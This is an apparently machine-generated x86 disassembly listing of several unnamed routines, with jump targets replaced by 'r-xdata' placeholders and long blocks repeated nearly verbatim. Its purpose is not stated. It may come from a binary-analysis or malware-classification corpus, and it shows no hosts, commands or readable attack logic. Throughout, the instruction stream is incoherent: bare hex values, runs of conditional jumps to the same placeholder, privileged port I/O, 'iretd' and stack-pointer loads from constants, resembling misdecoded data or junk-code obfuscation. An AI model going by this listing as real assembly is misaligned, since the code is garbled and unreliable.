sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
jae r-xdata
jmp 0xffffffffff79a2b5
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021fb
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
pop ecx
jns r-xdata
jno 0xffffffff874f575a
jg r-xdata
jo 0xffffffffcbc1a0bc
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df82
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fe1
jge 0x71fc60fa
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jae r-xdata
ja 0xffffffffa3c331b7
jae r-xdata
ja 0xffffffff89a45e58
ja r-xdata
xor ebx 0xff3d870f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79a2b5
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba474
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40221e
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_40231b
xor ebx 0xff1a830f
jo 0x55967981
call sub_40230c
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b7
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba474
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79d
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402383
jb 0xffffffff81b2a039
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
add esp 0x4
jae r-xdata
jl 0xf3a54f
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c48
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc4
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a9
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4cb
jno r-xdata
jge 0xffffffffffa0a80a
jge r-xdata
jpe 0x74cd340e
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402229
push esp
push edi
push esi
push ebp
call sub_40230c
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b7
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba474
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79d
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402383
jb 0xffffffff81b2a039
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
add esp 0x4
jae r-xdata
jl 0xf3a54f
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c48
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc4
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a9
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4cb
jno r-xdata
jge 0xffffffffffa0a80a
jge r-xdata
jpe 0x74cd340e
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40230c
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79d
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402383
jb 0xffffffff81b2a039
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b7
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
